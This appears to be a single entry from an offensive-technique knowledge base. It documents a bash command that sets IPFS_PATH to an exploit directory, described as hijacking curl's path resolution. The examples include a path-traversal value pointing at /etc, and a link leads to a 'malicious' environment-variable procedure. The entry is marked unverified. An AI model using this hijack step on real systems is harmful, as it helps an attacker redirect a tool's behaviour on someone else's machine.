---
id: f06388c7-8340-4d10-aa92-157a230951fc
name: export-ipfs-path
type: command
executor: bash
data: export IPFS_PATH="$EXPLOIT_DIR"
output: No output
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:16.979Z'
platforms:
  - Linux
tags:
  - env-var
  - hijack
verified: false
validated: true
submitted: true
---

# export-ipfs-path

## Command

```bash
export IPFS_PATH="$EXPLOIT_DIR"
```

## Description

Exports the IPFS_PATH variable to point to the exploit directory, hijacking curl's path resolution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| IPFS_PATH | Variable name | Yes |
| "$EXPLOIT_DIR" | Path to temp dir | Yes |

## Examples

### Basic Usage

```bash
export IPFS_PATH="/tmp/exploit"
```

### Advanced Usage

```bash
export IPFS_PATH="/tmp/../../../../etc"  # Direct traversal
```

## Expected Output

None; variable set for session.

## Related

- [[commands/unset-ipfs-path]]
- [[procedures/Export-Malicious-IPFS_PATH-Environment-Variable]]
